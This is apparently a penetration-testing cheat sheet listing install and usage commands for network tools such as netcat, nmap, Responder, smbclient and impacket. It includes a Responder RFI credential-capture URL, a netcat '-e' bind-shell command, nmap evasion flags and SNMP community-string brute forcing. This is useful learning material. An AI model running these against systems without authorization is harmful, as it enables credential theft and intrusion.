---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Tools and Utilities

Here are some tools and utilities commonly used for practices related to networks:

## <mark style="color:green;">OpenVPN</mark>

* VPN system which implements both client and server applications, including a command-line utility

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install openvpn
```
{% endcode %}

***

* Connect to a VPN

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo openvpn $ovpnfile
```
{% endcode %}

## <mark style="color:green;">SmbClient</mark>

* Tool for accessing a server using the [SMB](protocols/smb.md) protocol

### <mark style="color:yellow;">**Commands**</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install smbclient
```
{% endcode %}

***

* Connect and interact with an SMB server

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbclient -I $IP    #Connect to server
smbclient -L $IP -N #List elements on the server without providing a password 
smbclient //$IP/$ShareName       #Acces to a shared instance
smbclient \\\\$IP\\$ShareName    #Alternative
smbclient //$IP/$ShareName $username #Connect indicating a username
smbclient //$IP/$ShareName -c "$comand" #Execute a command
smb: \>                 #Text based interface
smb: \> get $filename   #Download a file
smb: \> put $filename   #Upload a file
smb: \> exit            #Close connection
```
{% endcode %}

## <mark style="color:green;">Responder</mark>

* Help in the passive obtention of credentials by mounting an [SMB](protocols/smb.md) server on the web that intercepts internal communication from this protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install responder
```
{% endcode %}

***

* Change configuration file

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf #Installed here by default
```
{% endcode %}

***

* Initialize tool

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo responder -I $networkinterface
```
{% endcode %}

{% hint style="warning" %}
If we get an error in any port, we have to update the _Responder.conf_ file and set to _off_ the value of the service related to that port
{% endhint %}

***

* Abuse an [RFI](../web-exploitation/broken-access-control/remote-file-inclusion.md) on a web page to intercept SMB credentials

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
</strong></code></pre>

{% hint style="info" %}
If the process works, we will see the server catch the credentials
{% endhint %}

## <mark style="color:green;">Tcpdump</mark>

* Command-line packet analyzer tool used to capture and inspect network traffic sent via the [TPC ](protocols/dns.md)protocol in real-time

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install tcpdump
```
{% endcode %}

***

* Set up listener

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo tcpdump -i $networkInterface port $port
```
{% endcode %}

## <mark style="color:green;">Netcat</mark>

* Unix utility which reads and writes data across network connections
* Can act as a server or as a listener
* By default makes a TCP connection but can be used with TCP or UDP protocol

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install netcat-traditional
```
{% endcode %}

***

* Start netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $hostname $port
nc -n $IP $port        #Use only numeric IP no DNS
nc -v $hostname $port  #Verbose Output
```
{% endcode %}

***

* Start in listen mode

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -l -p $port
nc -nvlp $port     #The best way to make it
```
{% endcode %}

***

* Make a file transmission

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port > $incomingfile  #From listening side
nc -n -v -p $port < $file       #From sender side

#From the listening side
$incomingfile -h    #Check if the transmission was correct 
```
{% endcode %}

***

* Execute a program over the server

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -l -p $port -e $program
```
{% endcode %}

***

* Interact with network protocols

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Example
sudo nc $ip 80 #We connect to HTTP service

#We send a petition
GET / HTTP/1.1
host: netcat      #After finishing hit enter to send
```
{% endcode %}

{% hint style="warning" %}
To make a line jump is necessary to press _Shift+Enter_
{% endhint %}

## <mark style="color:green;">Nmap</mark>

* Open source tool for network exploration and security auditing which works as a network mapper

### <mark style="color:yellow;">**NSE**</mark>

* The [Nmap Scripting Engine](https://nmap.org/nsedoc/) is a library of scripts written in Lua that can be used for scanning vulnerabilities and automating exploits for them.
* Every script has a category related to its use scenario
* By default nmap stores scripts in _/usr/share/nmap/scripts/script.db_

### <mark style="color:yellow;">**Scan types**</mark>

* _SYN_ scans are also known as _Half-open_ or _Stealth._ They are stealthier than _Connect_ scans
* The difference between _Connect_ and _SYN_ scans is that _Connect_ performs a full three-way handshake with the target. Instead of that _SYN_ scans send back an _RST_ packet after receiving an _SYN/ACK_
* The UDP scans are slower than TCP scans
* In UDP scans if the port is open it will send no response and will be marked as _open|filtered_. If there's a response will be marked as _open_. If is closed, the target responds with an ICMP packet containing a message that the port is unreachable
* _NULL_, _FIN_, and _Xmas_ are stealthier than _SYN_ or UDP scans, usually used for firewall evasion
* _NULL_ scans send a TCP request with no flags, the target host responds with _RST_ if the port is closed
* _FIN_ scans send a TCP request with the _FIN_ flag, used to gracefully close an active connection, the target host responds with _RST_ if the port is closed
* _Xmas_ scans send a malformed TCP packet, and the target host responds with _RST_ if the port is closed
* Microsoft Windows may respond to a _NULL_, _FIN_ or _Xmas_ scan with a _RST_ for every port

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install nmap
```
{% endcode %}

***

* Basic scans

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $scantype $options $target #General syntax
nmap $ip  #Scan an IP
nmap $domain  #Scan an IP using domain
nmap $ip1 $ip2  # Scan some IPs
nmap x.x.x.$range1-$range2 #Scan a range of IPs
nmap x.x.x.x/$mask  #Scan using CIDR notation
nmap -iL $inputfile #Scan using the IPs from a list
nmap -iR $number #Scan random hosts
nmap --exclude $ip  #Scan excluding an specific IP
nmap --excludefile $file #Scan excluding the IPs from a list
```
{% endcode %}

***

* TCP scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sT $target  #TCP Connect scan, default if run without sudo
nmap -sS $target  #TCP SYN scan, default if run with sudo
nmap -sN $target  #TCP Null scan
nmap -sF $target  #TCP FIN scan
nmap -sX $target  #TCP Xmas scan
nmap -sA $target  #TCP ACK scan
```
{% endcode %}

***

* UDP scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sU $target
nmap -sU --top-ports $numberofports $target   #Specify the most common UDP ports
```
{% endcode %}

***

* Select which port scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -p $port $target
nmap -p $port-port $target   #Select a range of ports
nmap -p- $target             #Scan all ports
```
{% endcode %}

***

* Perform Ping Sweep (not pinging a port to confirm is open)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn $target
```
{% endcode %}

***

* Only make host discovery

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo nmap -sn $target
</strong>sudo nmap -sn -PR $target #Only ARP scan
<strong>sudo nmap -sn -PE $target #Make ICMP echo request
</strong>sudo nmap -sn -PP $target #Make ICMP timestamp request
sudo nmap -sn -PM $target #Make address mask request
sudo nmap -sn -PS $ports $target #Use TCP SYN ping
sudo nmap -sn -PA $ports $target #Use TCP ACK ping
sudo nmap -sn -PU $ports $target #Use UDP ping
</code></pre>

{% hint style="info" %}
If _ICMP_ scans return MAC addresses means the hosts are in the same subnet
{% endhint %}

***

* DNS resolution

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -n #Don't use reverse DNS
sudo nmap -R #Use reverse DNS even with offline hosts
```
{% endcode %}

***

* Detect OS

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -O $target
```
{% endcode %}

***

* Get the version of services running

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV $target
```
{% endcode %}

***

* List hosts to be scanned without scanning them

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sL $targets
```
{% endcode %}

***

* Increase verbosity level of output

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -v $target
nmap -vv $target      #Level 2 verbosity, MOST recommended
nmap -vvv $target     #Level 3 verbosity
```
{% endcode %}

***

* Specified Output Format

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -oN $target  #Normal output
nmap -oX $target  #XML Format
nmap -oG $target  #Grepable Format
nmap -oA $target  #All 3 Formats at once
```
{% endcode %}

***

* Increase the speed the scan runs at

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -T$timinglevel $target
```
{% endcode %}

{% hint style="warning" %}
This mode is louder than normal
{% endhint %}

***

* Use scripts from the NSE library

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap -sC $target    #Script scan
</strong><strong>nmap --script=$scriptfile  $target
</strong>nmap --script=$category  $target  #Active all scripts in the category
nmap -p $port --script=$script --script-args $script.$arg='$argvalue' #Pass arguments to a script
#Search scripts
grep $keyword /usr/share/nmap/scripts/script.db    #Using grep
ls -l /usr/share/nmap/scripts/*$keyword*           #Using ls
</code></pre>

***

* Fragment packets sent in a scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target -f   
nmap $target -mpu $number   #Specify packet's length   
```
{% endcode %}

{% hint style="warning" %}
The length of packets must be a multiple of 8
{% endhint %}

***

* Specify the delay between packets sent

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --scan-delay $number ms
```
{% endcode %}

***

* Generate invalid checksum for packets

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --badsum   
```
{% endcode %}

***

* Append an arbitrary length of random data to the end of packets

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --data-length  $number  
```
{% endcode %}

## <mark style="color:green;">ARP-Scan</mark>

* Tool for making host discovery via [ARP](protocols/arp.md) protocol
* Only devices in the same subnet can be discovered

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install arp-scan
```
{% endcode %}

***

* Scan options

{% code overflow="wrap" lineNumbers="true" %}
```bash
arp-scan $tagetRange
arp-scan -l                           #Scan local network
arp-scan $tagetRange -I $netInterface #Specify which network interface to use
```
{% endcode %}

## <mark style="color:green;">Masscan</mark>

* Tool for making port scanning, which is optimized for speed, making it particularly useful for large-scale scans

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install masscan
```
{% endcode %}

***

* Scan options

{% code overflow="wrap" lineNumbers="true" %}
```bash
masscan $targetRange -p $ports
masscan $targetRange ‐‐top-ports $number #Specify number of most used ports
```
{% endcode %}

## <mark style="color:green;">Docker</mark>

* An open-source platform that allows to build, package, and run applications in isolated environments called containers

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install docker-ce docker-ce-cli containerd.io
sudo apt install docker-compose-plugin #Install docker-compose
```
{% endcode %}

***

* Manage containers and images

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">sudo docker rm $containerID #Delete a container
sudo docker build . #Build an image from a Dockerfile in the actual folder
<strong>sudo docker image ls #List all installed images
</strong>sudo docker image rm $imageID #Delete a installed image
sudo docker container ls        #List all running containers
sudo docker run $containerID    #Run container using ID
sudo docker run $containerName  #Run container using Name
sudo docker run $containerName --rm #Run container but deleted when done
sudo docker run $containerName -p $hostPort:$containerPort #Specificate run ports
sudo docker container stop $containerID #Stop a running container
sudo docker compose up -d #Use .yml file to run various containers in the background
</code></pre>

## <mark style="color:green;">onesixtyone</mark>

* Is an SNMP scanner used to brute force the community string names

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install onesixtyone
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
onesixtyone -c $dictionary $IP
```
{% endcode %}

## <mark style="color:green;">xfreerdp</mark>

* An open-source implementation for the [RDP](protocols/rdp.md) protocol

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install freerdp2-x11
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
xfreerdp /v:$host #Conenct to a remote machine
xfreerdp /v:$host /u:$username #Connect as a user without providing a password
xfreerdp /v:$host /u:$username /p:$password #Connect as a user providing password
```
{% endcode %}

## <mark style="color:green;">Rsync</mark>

* Command-line tool for fast, flexible, and efficient file and directory synchronization and transfer between two locations

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install rsync
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
rsync $IP #Connect to the remote service
rsync --list-only $IP #Just list the contents
rsync 10.129.197.128:: #When the target is using a daemon instead of SSH
rsync --list-only $IP::$foldername #List content fo a folder
rsync $IP::$foldername/$filename $localroute #Transfer a shared file
```
{% endcode %}

## <mark style="color:green;">Impacket</mark>

* Collection of Python classes for working with network protocols

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install python3-impacket
```
{% endcode %}

***

* Use of scripts

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">sudo impacket-$scriptname $options
sudo impacket-mssqlclient  $hostname/$user@$ip #Connect to MS SQL server
<strong>sudo impacket-mssqlclient  $hostname/$user@$ip -windows-auth #Use Windows authentication to connect to MS SQL server
</strong>sudo impacket-psexec $username@$IP #Connect to the network service of a host
</code></pre>
